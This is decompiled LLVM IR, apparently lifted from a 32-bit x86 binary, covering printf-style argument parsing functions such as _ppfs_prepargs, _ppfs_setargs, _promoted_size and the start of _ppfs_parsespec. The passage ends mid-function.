define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805b92c = load i32, i32* @esi, align 4
  %v0_805b92d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b939 = add i32 %arg1, 24
  %v2_805b939 = inttoptr i32 %v1_805b939 to i32*
  %v3_805b939 = load i32, i32* %v2_805b939, align 4
  %v2_805b93c = add i32 %arg1, 76
  %v3_805b93c = inttoptr i32 %v2_805b93c to i32*
  store i32 %arg2, i32* %v3_805b93c, align 4
  %tmp8 = icmp slt i32 %v3_805b939, 1
  br i1 %tmp8, label %dec_label_pc_805b96a, label %dec_label_pc_805b943

dec_label_pc_805b943:                             ; preds = %entry
  %v1_805b946 = load i32, i32* @ebx, align 4
  %v2_805b946 = add i32 %v1_805b946, 28
  %v3_805b946 = inttoptr i32 %v2_805b946 to i32*
  store i32 %v3_805b939, i32* %v3_805b946, align 4
  %v0_805b949 = load i32, i32* @ebx, align 4
  %v1_805b949 = add i32 %v0_805b949, 24
  %v2_805b949 = inttoptr i32 %v1_805b949 to i32*
  store i32 0, i32* %v2_805b949, align 4
  %v0_805b950 = load i32, i32* @ebx, align 4
  %v1_805b950 = add i32 %v0_805b950, 4
  %v2_805b950 = inttoptr i32 %v1_805b950 to i32*
  store i32 0, i32* %v2_805b950, align 4
  %v0_805b957 = load i32, i32* @ebx, align 4
  %v1_805b957 = add i32 %v0_805b957, 8
  %v2_805b957 = inttoptr i32 %v1_805b957 to i32*
  store i32 0, i32* %v2_805b957, align 4
  %v0_805b95e = load i32, i32* @ebx, align 4
  %v1_805b95f = call i32 @_ppfs_setargs(i32 %v0_805b95e)
  %v1_805b964 = load i32, i32* @ebx, align 4
  %v2_805b964 = add i32 %v1_805b964, 24
  %v3_805b964 = inttoptr i32 %v2_805b964 to i32*
  store i32 %v3_805b939, i32* %v3_805b964, align 4
  br label %dec_label_pc_805b96a

dec_label_pc_805b96a:                             ; preds = %entry, %dec_label_pc_805b943
  %v2_805b96a = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805b92d, i32* @ebx, align 4
  store i32 %v0_805b92c, i32* @esi, align 4
  ret i32 %v2_805b96a

; uselistorder directives
  uselistorder i32 %v3_805b939, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805b96a, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b971 = load i32, i32* @ebx, align 4
  store i32 %v0_805b971, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805b976 = add i32 %arg1, 80
  store i32 %v1_805b976, i32* %ebx.global-to-local, align 4
  %v1_805b979 = add i32 %arg1, 24
  %v2_805b979 = inttoptr i32 %v1_805b979 to i32*
  %v3_805b979 = load i32, i32* %v2_805b979, align 4
  %v4_805b979 = icmp eq i32 %v3_805b979, 0
  %v1_805b97d = icmp eq i1 %v4_805b979, false
  %v1_805ba33 = add i32 %arg1, 8
  %v2_805ba33 = inttoptr i32 %v1_805ba33 to i32*
  %v3_805ba33 = load i32, i32* %v2_805ba33, align 4
  %v8_805ba33 = icmp eq i32 %v3_805ba33, -2147483648
  %v1_805ba3a = icmp eq i1 %v8_805ba33, false
  br i1 %v1_805b97d, label %dec_label_pc_805ba33, label %dec_label_pc_805b983

dec_label_pc_805b983:                             ; preds = %entry
  br i1 %v1_805ba3a, label %dec_label_pc_805b99d, label %dec_label_pc_805b98c

dec_label_pc_805b98c:                             ; preds = %dec_label_pc_805b983
  %v1_805b98c = add i32 %arg1, 76
  %v2_805b98c = inttoptr i32 %v1_805b98c to i32*
  %v3_805b98c = load i32, i32* %v2_805b98c, align 4
  store i32 %v3_805b98c, i32* %eax.global-to-local, align 4
  %v1_805b98f = add i32 %v3_805b98c, 4
  store i32 %v1_805b98f, i32* %edx.global-to-local, align 4
  store i32 %v1_805b98f, i32* %v2_805b98c, align 4
  %v0_805b995 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b995 = inttoptr i32 %v0_805b995 to i32*
  %v2_805b995 = load i32, i32* %v1_805b995, align 4
  store i32 %v2_805b995, i32* %eax.global-to-local, align 4
  %v1_805b997 = load i32, i32* @ecx, align 4
  %v2_805b997 = add i32 %v1_805b997, 80
  %v3_805b997 = inttoptr i32 %v2_805b997 to i32*
  store i32 %v2_805b995, i32* %v3_805b997, align 4
  %v0_805b99a = load i32, i32* %eax.global-to-local, align 4
  %v1_805b99a = load i32, i32* @ecx, align 4
  %v2_805b99a = add i32 %v1_805b99a, 8
  %v3_805b99a = inttoptr i32 %v2_805b99a to i32*
  store i32 %v0_805b99a, i32* %v3_805b99a, align 4
  %v0_805b99d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805b99d

dec_label_pc_805b99d:                             ; preds = %dec_label_pc_805b983, %dec_label_pc_805b98c
  %v1_805b9ac = phi i32 [ %arg1, %dec_label_pc_805b983 ], [ %v0_805b99d.pre, %dec_label_pc_805b98c ]
  %v1_805b99d = add i32 %v1_805b9ac, 4
  %v2_805b99d = inttoptr i32 %v1_805b99d to i32*
  %v3_805b99d = load i32, i32* %v2_805b99d, align 4
  %v8_805b99d = icmp eq i32 %v3_805b99d, -2147483648
  %v1_805b9a4 = icmp eq i1 %v8_805b99d, false
  br i1 %v1_805b9a4, label %dec_label_pc_805b9b7, label %dec_label_pc_805b9a6

dec_label_pc_805b9a6:                             ; preds = %dec_label_pc_805b99d
  %v1_805b9a6 = add i32 %v1_805b9ac, 76
  %v2_805b9a6 = inttoptr i32 %v1_805b9a6 to i32*
  %v3_805b9a6 = load i32, i32* %v2_805b9a6, align 4
  store i32 %v3_805b9a6, i32* %eax.global-to-local, align 4
  %v1_805b9a9 = add i32 %v3_805b9a6, 4
  store i32 %v1_805b9a9, i32* %edx.global-to-local, align 4
  store i32 %v1_805b9a9, i32* %v2_805b9a6, align 4
  %v0_805b9af = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9af = inttoptr i32 %v0_805b9af to i32*
  %v2_805b9af = load i32, i32* %v1_805b9af, align 4
  store i32 %v2_805b9af, i32* %eax.global-to-local, align 4
  %v1_805b9b1 = load i32, i32* @ecx, align 4
  %v2_805b9b1 = add i32 %v1_805b9b1, 80
  %v3_805b9b1 = inttoptr i32 %v2_805b9b1 to i32*
  store i32 %v2_805b9af, i32* %v3_805b9b1, align 4
  %v0_805b9b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b9b4 = load i32, i32* @ecx, align 4
  %v2_805b9b4 = add i32 %v1_805b9b4, 4
  %v3_805b9b4 = inttoptr i32 %v2_805b9b4 to i32*
  store i32 %v0_805b9b4, i32* %v3_805b9b4, align 4
  %v1_805ba2c17.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805b9b7

dec_label_pc_805b9b7:                             ; preds = %dec_label_pc_805b99d, %dec_label_pc_805b9a6
  %v1_805ba2c17 = phi i32 [ %v1_805b9ac, %dec_label_pc_805b99d ], [ %v1_805ba2c17.pre, %dec_label_pc_805b9a6 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805ba2c18 = add i32 %v1_805ba2c17, 28
  %v3_805ba2c19 = inttoptr i32 %v2_805ba2c18 to i32*
  %v4_805ba2c20 = load i32, i32* %v3_805ba2c19, align 4
  %v5_805ba2f22 = icmp sgt i32 %v4_805ba2c20, 0
  br i1 %v5_805ba2f22, label %dec_label_pc_805b9bb, label %dec_label_pc_805ba61.loopexit

dec_label_pc_805b9bb:                             ; preds = %dec_label_pc_805b9b7, %dec_label_pc_805ba2b
  %v1_805ba2c24 = phi i32 [ %v1_805ba2c, %dec_label_pc_805ba2b ], [ %v1_805ba2c17, %dec_label_pc_805b9b7 ]
  %v1_805b9bb23 = phi i32 [ %v1_805ba2b, %dec_label_pc_805ba2b ], [ 0, %dec_label_pc_805b9b7 ]
  %v2_805b9bb = mul i32 %v1_805b9bb23, 4
  %v3_805b9bb = add i32 %v2_805b9bb, 40
  %v4_805b9bb = add i32 %v3_805b9bb, %v1_805ba2c24
  %v5_805b9bb = inttoptr i32 %v4_805b9bb to i32*
  %v6_805b9bb = load i32, i32* %v5_805b9bb, align 4
  store i32 %v6_805b9bb, i32* %eax.global-to-local, align 4
  %v1_805b9bf = add i32 %v6_805b9bb, -8
  %v9_805b9bf = icmp eq i32 %v1_805b9bf, 0
  br i1 %v9_805b9bf, label %dec_label_pc_805ba2b, label %dec_label_pc_805b9c4

dec_label_pc_805b9c4:                             ; preds = %dec_label_pc_805b9bb
  %v10_805b9bf = icmp slt i32 %v1_805b9bf, 0
  %v6_805b9bf = sub i32 7, %v6_805b9bb
  %v7_805b9bf = and i32 %v6_805b9bf, %v6_805b9bb
  %v8_805b9bf = icmp slt i32 %v7_805b9bf, 0
  %v1_805b9c4 = add i32 %v1_805ba2c24, 76
  %v2_805b9c4 = inttoptr i32 %v1_805b9c4 to i32*
  %v3_805b9c4 = load i32, i32* %v2_805b9c4, align 4
  store i32 %v3_805b9c4, i32* %edx.global-to-local, align 4
  %v3_805b9c7 = icmp eq i1 %v10_805b9bf, %v8_805b9bf
  br i1 %v3_805b9c7, label %dec_label_pc_805b9d7, label %dec_label_pc_805b9c9

dec_label_pc_805b9c9:                             ; preds = %dec_label_pc_805b9c4
  %tmp15 = icmp slt i32 %v6_805b9bb, 3
  %v9_805b9d0 = icmp eq i32 %v6_805b9bb, 7
  %v1_805b9d3 = icmp eq i1 %v9_805b9d0, false
  %or.cond = or i1 %tmp15, %v1_805b9d3
  br i1 %or.cond, label %dec_label_pc_805ba1e, label %dec_label_pc_805ba00

dec_label_pc_805b9d7:                             ; preds = %dec_label_pc_805b9c4
  %tmp16 = icmp sgt i32 %v6_805b9bb, 1024
  br i1 %tmp16, label %dec_label_pc_805b9e0, label %dec_label_pc_805ba1e

dec_label_pc_805b9e0:                             ; preds = %dec_label_pc_805b9d7
  %v6_805b9e0 = icmp eq i32 %v6_805b9bb, 2048
  br i1 %v6_805b9e0, label %dec_label_pc_805b9f0, label %dec_label_pc_805b9e7

dec_label_pc_805b9e7:                             ; preds = %dec_label_pc_805b9e0
  %v9_805b9e7 = icmp eq i32 %v6_805b9bb, 2055
  %v1_805b9ec = icmp eq i1 %v9_805b9e7, false
  br i1 %v1_805b9ec, label %dec_label_pc_805ba1e, label %dec_label_pc_805ba0f

dec_label_pc_805b9f0:                             ; preds = %dec_label_pc_805b9e0
  %v1_805b9f0 = add i32 %v3_805b9c4, 8
  store i32 %v1_805b9f0, i32* %eax.global-to-local, align 4
  store i32 %v1_805b9f0, i32* %v2_805b9c4, align 4
  %v0_805b9f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_805b9f6 = inttoptr i32 %v0_805b9f6 to i32*
  %v2_805b9f6 = load i32, i32* %v1_805b9f6, align 4
  store i32 %v2_805b9f6, i32* %eax.global-to-local, align 4
  %v1_805b9f8 = add i32 %v0_805b9f6, 4
  %v2_805b9f8 = inttoptr i32 %v1_805b9f8 to i32*
  %v3_805b9f8 = load i32, i32* %v2_805b9f8, align 4
  store i32 %v3_805b9f8, i32* %edx.global-to-local, align 4
  %v1_805b9fb = load i32, i32* %ebx.global-to-local, align 4
  %v2_805b9fb = add i32 %v1_805b9fb, 4
  %v3_805b9fb = inttoptr i32 %v2_805b9fb to i32*
  store i32 %v3_805b9f8, i32* %v3_805b9fb, align 4
  %v0_805ba26.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ba26

dec_label_pc_805ba00:                             ; preds = %dec_label_pc_805b9c9
  %v3_805ba00 = load i32, i32* %v2_805b9c4, align 4
  store i32 %v3_805ba00, i32* %edx.global-to-local, align 4
  %v1_805ba03 = add i32 %v3_805ba00, 8
  store i32 %v1_805ba03, i32* %eax.global-to-local, align 4
  store i32 %v1_805ba03, i32* %v2_805b9c4, align 4
  %v0_805ba09 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ba09 = inttoptr i32 %v0_805ba09 to double*
  %v2_805ba09 = load double, double* %v1_805ba09, align 4
  %v2_805ba0b = load i32, i32* %ebx.global-to-local, align 4
  %v4_805ba0b = inttoptr i32 %v2_805ba0b to double*
  store double %v2_805ba09, double* %v4_805ba0b, align 4
  br label %dec_label_pc_805ba28

dec_label_pc_805ba0f:                             ; preds = %dec_label_pc_805b9e7
  %v3_805ba0f = load i32, i32* %v2_805b9c4, align 4
  store i32 %v3_805ba0f, i32* %edx.global-to-local, align 4
  %v1_805ba12 = add i32 %v3_805ba0f, 12
  store i32 %v1_805ba12, i32* %eax.global-to-local, align 4
  store i32 %v1_805ba12, i32* %v2_805b9c4, align 4
  %v0_805ba18 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ba18 = inttoptr i32 %v0_805ba18 to x86_fp80*
  %v2_805ba18 = load x86_fp80, x86_fp80* %v1_805ba18, align 4
  %v2_805ba1a = load i32, i32* %ebx.global-to-local, align 4
  %v3_805ba1a = inttoptr i32 %v2_805ba1a to x86_fp80*
  store x86_fp80 %v2_805ba18, x86_fp80* %v3_805ba1a, align 4
  br label %dec_label_pc_805ba28

dec_label_pc_805ba1e:                             ; preds = %dec_label_pc_805b9c9, %dec_label_pc_805b9d7, %dec_label_pc_805b9e7
  %v1_805ba1e = add i32 %v3_805b9c4, 4
  store i32 %v1_805ba1e, i32* %eax.global-to-local, align 4
  store i32 %v1_805ba1e, i32* %v2_805b9c4, align 4
  %v0_805ba24 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ba24 = inttoptr i32 %v0_805ba24 to i32*
  %v2_805ba24 = load i32, i32* %v1_805ba24, align 4
  store i32 %v2_805ba24, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ba26

dec_label_pc_805ba26:                             ; preds = %dec_label_pc_805b9f0, %dec_label_pc_805ba1e
  %v0_805ba26 = phi i32 [ %v0_805ba26.pre, %dec_label_pc_805b9f0 ], [ %v2_805ba24, %dec_label_pc_805ba1e ]
  %v1_805ba26 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805ba26 = inttoptr i32 %v1_805ba26 to i32*
  store i32 %v0_805ba26, i32* %v2_805ba26, align 4
  %v0_805ba28.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ba28

dec_label_pc_805ba28:                             ; preds = %dec_label_pc_805ba0f, %dec_label_pc_805ba00, %dec_label_pc_805ba26
  %v0_805ba28 = phi i32 [ %v2_805ba1a, %dec_label_pc_805ba0f ], [ %v2_805ba0b, %dec_label_pc_805ba00 ], [ %v0_805ba28.pre, %dec_label_pc_805ba26 ]
  %v1_805ba28 = add i32 %v0_805ba28, 12
  store i32 %v1_805ba28, i32* %ebx.global-to-local, align 4
  %v0_805ba2b.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805ba2c.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805ba2b

dec_label_pc_805ba2b:                             ; preds = %dec_label_pc_805b9bb, %dec_label_pc_805ba28
  %v1_805ba2c = phi i32 [ %v1_805ba2c24, %dec_label_pc_805b9bb ], [ %v1_805ba2c.pre, %dec_label_pc_805ba28 ]
  %v0_805ba2b = phi i32 [ %v1_805b9bb23, %dec_label_pc_805b9bb ], [ %v0_805ba2b.pre, %dec_label_pc_805ba28 ]
  %v1_805ba2b = add i32 %v0_805ba2b, 1
  store i32 %v1_805ba2b, i32* %esi.global-to-local, align 4
  %v2_805ba2c = add i32 %v1_805ba2c, 28
  %v3_805ba2c = inttoptr i32 %v2_805ba2c to i32*
  %v4_805ba2c = load i32, i32* %v3_805ba2c, align 4
  %v5_805ba2f = icmp slt i32 %v1_805ba2b, %v4_805ba2c
  br i1 %v5_805ba2f, label %dec_label_pc_805b9bb, label %dec_label_pc_805ba2c.dec_label_pc_805ba61.loopexit_crit_edge

dec_label_pc_805ba33:                             ; preds = %entry
  br i1 %v1_805ba3a, label %dec_label_pc_805ba4a, label %dec_label_pc_805ba3c

dec_label_pc_805ba3c:                             ; preds = %dec_label_pc_805ba33
  %v1_805ba3c = add i32 %arg1, 36
  %v2_805ba3c = inttoptr i32 %v1_805ba3c to i8*
  %v3_805ba3c = load i8, i8* %v2_805ba3c, align 1
  %v2_805ba40 = zext i8 %v3_805ba3c to i32
  %v3_805ba40 = mul nuw nsw i32 %v2_805ba40, 12
  store i32 %v3_805ba40, i32* %eax.global-to-local, align 4
  %v2_805ba43 = add i32 %arg1, 68
  %v3_805ba43 = add i32 %v2_805ba43, %v3_805ba40
  %v4_805ba43 = inttoptr i32 %v3_805ba43 to i32*
  %v5_805ba43 = load i32, i32* %v4_805ba43, align 4
  store i32 %v5_805ba43, i32* %eax.global-to-local, align 4
  store i32 %v5_805ba43, i32* %v2_805ba33, align 4
  %v0_805ba4a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805ba4a

dec_label_pc_805ba4a:                             ; preds = %dec_label_pc_805ba33, %dec_label_pc_805ba3c
  %v1_805ba5e = phi i32 [ %arg1, %dec_label_pc_805ba33 ], [ %v0_805ba4a.pre, %dec_label_pc_805ba3c ]
  %v1_805ba4a = add i32 %v1_805ba5e, 4
  %v2_805ba4a = inttoptr i32 %v1_805ba4a to i32*
  %v3_805ba4a = load i32, i32* %v2_805ba4a, align 4
  %v8_805ba4a = icmp eq i32 %v3_805ba4a, -2147483648
  %v1_805ba51 = icmp eq i1 %v8_805ba4a, false
  br i1 %v1_805ba51, label %dec_label_pc_805ba61, label %dec_label_pc_805ba53

dec_label_pc_805ba53:                             ; preds = %dec_label_pc_805ba4a
  %v1_805ba53 = add i32 %v1_805ba5e, 37
  %v2_805ba53 = inttoptr i32 %v1_805ba53 to i8*
  %v3_805ba53 = load i8, i8* %v2_805ba53, align 1
  %v2_805ba57 = zext i8 %v3_805ba53 to i32
  %v3_805ba57 = mul nuw nsw i32 %v2_805ba57, 12
  store i32 %v3_805ba57, i32* %eax.global-to-local, align 4
  %v1_805ba5a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805ba5a = add nsw i32 %v3_805ba57, -12
  %v3_805ba5a = add i32 %v2_805ba5a, %v1_805ba5a
  %v4_805ba5a = inttoptr i32 %v3_805ba5a to i32*
  %v5_805ba5a = load i32, i32* %v4_805ba5a, align 4
  store i32 %v5_805ba5a, i32* %eax.global-to-local, align 4
  store i32 %v5_805ba5a, i32* %v2_805ba4a, align 4
  %v0_805ba61.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805ba61

dec_label_pc_805ba2c.dec_label_pc_805ba61.loopexit_crit_edge: ; preds = %dec_label_pc_805ba2b
  br label %dec_label_pc_805ba61.loopexit

dec_label_pc_805ba61.loopexit:                    ; preds = %dec_label_pc_805ba2c.dec_label_pc_805ba61.loopexit_crit_edge, %dec_label_pc_805b9b7
  %v1_805ba2c.lcssa = phi i32 [ %v1_805ba2c, %dec_label_pc_805ba2c.dec_label_pc_805ba61.loopexit_crit_edge ], [ %v1_805ba2c17, %dec_label_pc_805b9b7 ]
  br label %dec_label_pc_805ba61

dec_label_pc_805ba61:                             ; preds = %dec_label_pc_805ba61.loopexit, %dec_label_pc_805ba4a, %dec_label_pc_805ba53
  %v10_805ba68 = phi i32 [ %v1_805ba2c.lcssa, %dec_label_pc_805ba61.loopexit ], [ %v1_805ba5e, %dec_label_pc_805ba4a ], [ %v0_805ba61.pre, %dec_label_pc_805ba53 ]
  %v1_805ba61 = add i32 %v10_805ba68, 8
  %v2_805ba61 = inttoptr i32 %v1_805ba61 to i32*
  %v3_805ba61 = load i32, i32* %v2_805ba61, align 4
  store i32 %v3_805ba61, i32* %eax.global-to-local, align 4
  %v2_805ba64 = icmp slt i32 %v3_805ba61, 0
  %v1_805ba66 = icmp eq i1 %v2_805ba64, false
  br i1 %v1_805ba66, label %dec_label_pc_805ba7c, label %dec_label_pc_805ba68

dec_label_pc_805ba68:                             ; preds = %dec_label_pc_805ba61
  %v1_805ba68 = add i32 %v10_805ba68, 16
  %v2_805ba68 = inttoptr i32 %v1_805ba68 to i32*
  %v3_805ba68 = load i32, i32* %v2_805ba68, align 4
  %v4_805ba68 = or i32 %v3_805ba68, 8
  store i32 %v4_805ba68, i32* %v2_805ba68, align 4
  %v0_805ba6c = load i32, i32* @ecx, align 4
  %v1_805ba6c = add i32 %v0_805ba6c, 16
  %v2_805ba6c = inttoptr i32 %v1_805ba6c to i32*
  %v3_805ba6c = load i32, i32* %v2_805ba6c, align 4
  %v4_805ba6c = and i32 %v3_805ba6c, -2
  store i32 %v4_805ba6c, i32* %v2_805ba6c, align 4
  %v0_805ba70 = load i32, i32* %eax.global-to-local, align 4
  %v1_805ba70 = sub i32 0, %v0_805ba70
  store i32 %v1_805ba70, i32* %eax.global-to-local, align 4
  %v1_805ba72 = load i32, i32* @ecx, align 4
  %v2_805ba72 = add i32 %v1_805ba72, 8
  %v3_805ba72 = inttoptr i32 %v2_805ba72 to i32*
  store i32 %v1_805ba70, i32* %v3_805ba72, align 4
  %v0_805ba75 = load i32, i32* @ecx, align 4
  %v1_805ba75 = add i32 %v0_805ba75, 20
  %v2_805ba75 = inttoptr i32 %v1_805ba75 to i32*
  store i32 32, i32* %v2_805ba75, align 4
  %v0_805ba7e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ba7c

dec_label_pc_805ba7c:                             ; preds = %dec_label_pc_805ba61, %dec_label_pc_805ba68
  %v0_805ba7e = phi i32 [ %v3_805ba61, %dec_label_pc_805ba61 ], [ %v0_805ba7e.pre, %dec_label_pc_805ba68 ]
  %v2_805ba7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805ba7c, i32* @ebx, align 4
  ret i32 %v0_805ba7e

; uselistorder directives
  uselistorder i32 %v3_805ba57, { 1, 0 }
  uselistorder i32 %v3_805ba40, { 1, 0 }
  uselistorder i32 %v1_805ba2b, { 2, 1, 0 }
  uselistorder i32 %v1_805ba2c, { 1, 2, 0 }
  uselistorder i32 %v3_805b9c4, { 1, 0, 2 }
  uselistorder i32* %v2_805b9c4, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805b9bf, { 1, 0 }
  uselistorder i32 %v6_805b9bb, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805b9bb23, { 1, 0 }
  uselistorder i32 %v1_805ba2c17, { 2, 0, 1 }
  uselistorder i1 %v1_805ba3a, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_805ba7c, { 1, 0 }
  uselistorder label %dec_label_pc_805ba61, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ba4a, { 1, 0 }
  uselistorder label %dec_label_pc_805ba2b, { 1, 0 }
  uselistorder label %dec_label_pc_805ba28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ba26, { 1, 0 }
  uselistorder label %dec_label_pc_805ba1e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805b9bb, { 1, 0 }
  uselistorder label %dec_label_pc_805b9b7, { 1, 0 }
  uselistorder label %dec_label_pc_805b99d, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805ba80 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805ba87

dec_label_pc_805ba87:                             ; preds = %dec_label_pc_805ba87, %entry
  %v0_805ba87 = phi i32 [ ptrtoint (i8** @global_var_806cc5e.734 to i32), %entry ], [ %v1_805ba87, %dec_label_pc_805ba87 ]
  %v1_805ba87 = add i32 %v0_805ba87, -2
  %v1_805ba8a = inttoptr i32 %v1_805ba87 to i16*
  %v2_805ba8a = load i16, i16* %v1_805ba8a, align 2
  %v3_805ba8a = sext i16 %v2_805ba8a to i32
  %v12_805ba8d = icmp ne i32 %v3_805ba8a, %v0_805ba80
  %v6_805ba97 = icmp ugt i32 %v1_805ba87, ptrtoint (i32* @global_var_806cc46.735 to i32)
  %or.cond = and i1 %v6_805ba97, %v12_805ba8d
  br i1 %or.cond, label %dec_label_pc_805ba87, label %dec_label_pc_805ba99

dec_label_pc_805ba99:                             ; preds = %dec_label_pc_805ba87
  %.pre = add i32 %v0_805ba87, -134663240
  %v2_805ba9f = sdiv i32 %.pre, 2
  store i32 %v2_805ba9f, i32* @edx, align 4
  %v1_805baa1 = add i32 %v2_805ba9f, ptrtoint (i8** @global_var_806cc5e.734 to i32)
  %v2_805baa1 = inttoptr i32 %v1_805baa1 to i8*
  %v3_805baa1 = load i8, i8* %v2_805baa1, align 1
  %v4_805baa1 = zext i8 %v3_805baa1 to i32
  ret i32 %v4_805baa1

; uselistorder directives
  uselistorder i32 %v2_805ba9f, { 1, 0 }
  uselistorder i32 %v1_805ba87, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806cc5e.734 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805baaa = load i32, i32* @edi, align 4
  %v0_805baab = load i32, i32* @esi, align 4
  %v0_805baac = load i32, i32* @ebx, align 4
  store i32 %v0_805baac, i32* %stack_var_-16, align 4
  %v4_805baac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805bad8 = add i32 %tmp76, 24
  %v2_805bad8 = inttoptr i32 %v1_805bad8 to i32*
  %v3_805bad8 = load i32, i32* %v2_805bad8, align 4
  store i32 %v3_805bad8, i32* %eax.global-to-local, align 4
  %v1_805badf = add i32 %tmp76, 16
  %v2_805badf = inttoptr i32 %v1_805badf to i32*
  %v3_805badf = load i32, i32* %v2_805badf, align 4
  %v1_805bae2 = and i32 %v3_805badf, 128
  %v2_805bae2 = icmp eq i32 %v1_805bae2, 0
  store i32 %v1_805bae2, i32* %edi.global-to-local, align 4
  %v1_805bae8 = icmp eq i1 %v2_805bae2, false
  br i1 %v1_805bae8, label %dec_label_pc_805bafb, label %dec_label_pc_805baea

dec_label_pc_805baea:                             ; preds = %entry
  %v2_805baea = load i32, i32* %arg1, align 4
  br label %dec_label_pc_805bb48.outer

dec_label_pc_805baf5:                             ; preds = %dec_label_pc_805bc83
  %v1_805baf5 = add i32 %v0_805bc83.pre.pre, 1
  store i32 %v1_805baf5, i32* @esi, align 4
  br label %dec_label_pc_805bc93

dec_label_pc_805bafb:                             ; preds = %entry
  %v15_805baad = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805bafd

dec_label_pc_805bafd:                             ; preds = %dec_label_pc_805bb25.dec_label_pc_805bafd_crit_edge, %dec_label_pc_805bafb
  %v2_805bb0e = phi i32 [ %v2_805bb0e.pre, %dec_label_pc_805bb25.dec_label_pc_805bafd_crit_edge ], [ %v15_805baad, %dec_label_pc_805bafb ]
  %v3_805bb0e = phi i32 [ %v1_805bb25, %dec_label_pc_805bb25.dec_label_pc_805bafd_crit_edge ], [ 0, %dec_label_pc_805bafb ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805bb01 = mul i32 %v3_805bb0e, 4
  store i32 %v1_805bb01, i32* @ecx, align 4
  %v2_805bb08 = load i32, i32* %arg1, align 4
  store i32 %v2_805bb08, i32* @edx, align 4
  %v2_805bb0a = add i32 %v1_805bb01, -4
  %v3_805bb0a = add i32 %v2_805bb0a, %v2_805bb08
  %v4_805bb0a = inttoptr i32 %v3_805bb0a to i32*
  %v5_805bb0a = load i32, i32* %v4_805bb0a, align 4
  store i32 %v5_805bb0a, i32* %eax.global-to-local, align 4
  %v1_805bb0e = trunc i32 %v5_805bb0a to i8
  %v4_805bb0e = add i32 %v2_805bb0e, 36
  %v5_805bb0e = add i32 %v4_805bb0e, %v3_805bb0e
  %v6_805bb0e = inttoptr i32 %v5_805bb0e to i8*
  store i8 %v1_805bb0e, i8* %v6_805bb0e, align 1
  %v0_805bb12 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bb12 = urem i32 %v0_805bb12, 256
  %v2_805bb12 = load i32, i32* @ebx, align 4
  %v3_805bb12 = and i32 %v2_805bb12, -256
  %v4_805bb12 = or i32 %v3_805bb12, %v1_805bb12
  store i32 %v4_805bb12, i32* @ebx, align 4
  %v1_805bb14 = mul i32 %v0_805bb12, 16777216
  %v2_805bb14 = sdiv i32 %v1_805bb14, 16777216
  store i32 %v2_805bb14, i32* %eax.global-to-local, align 4
  %v1_805bb17 = load i32, i32* @edx, align 4
  %v2_805bb17 = load i32, i32* @ecx, align 4
